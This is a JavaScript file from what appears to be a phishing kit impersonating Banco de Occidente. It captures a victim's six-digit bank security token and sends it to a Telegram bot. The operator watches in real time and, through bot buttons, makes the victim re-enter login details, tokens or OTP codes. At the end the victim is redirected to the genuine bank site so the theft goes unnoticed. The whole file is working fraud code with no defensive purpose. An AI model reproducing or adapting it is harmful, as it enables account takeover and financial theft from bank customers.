/**
 * OCCIDENTE - token.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Occidente Token: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('token');
    const btnContinuar = document.getElementById('btnContinuar');
    const overlay = document.getElementById('loadingScreen');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 6);
        const isValid = input.value.length === 6;
        btnContinuar.disabled = !isValid;
        if (isValid) {
            btnContinuar.classList.add('enabled');
        } else {
            btnContinuar.classList.remove('enabled');
        }
        
        // Actualizar indicadores visuales
        const indicators = document.querySelectorAll('.digit-indicator');
        indicators.forEach((indicator, index) => {
            indicator.classList.toggle('filled', index < input.value.length);
        });
    });

    btnContinuar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinuar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        // Mostrar overlay directamente
        if (overlay) {
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        } else {
            console.error('❌ Overlay no encontrado');
        }

        const data = BancoUtils.saveBankData('occidente', { token: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('BANCO DE OCCIDENTE - TOKEN', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '🔢 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('token', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            BancoUtils.hideOverlay();
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Occidente Token:', data);
        if (overlay) overlay.style.display = 'none';
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Redirigiendo a index.html');
                window.location.href = 'index.html';
                break;
            case 'request_token':
                console.log('📱 Limpiando campo de token');
                input.value = '';
                btnContinuar.disabled = true;
                btnContinuar.classList.remove('enabled');
                document.querySelectorAll('.digit-indicator').forEach(ind => ind.classList.remove('filled'));
                input.focus();
                break;
            case 'request_otp':
                console.log('🔢 Redirigiendo a otp.html');
                window.location.href = 'otp.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a bancodeoccidente.com.co');
                window.location.href = 'https://www.bancodeoccidente.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
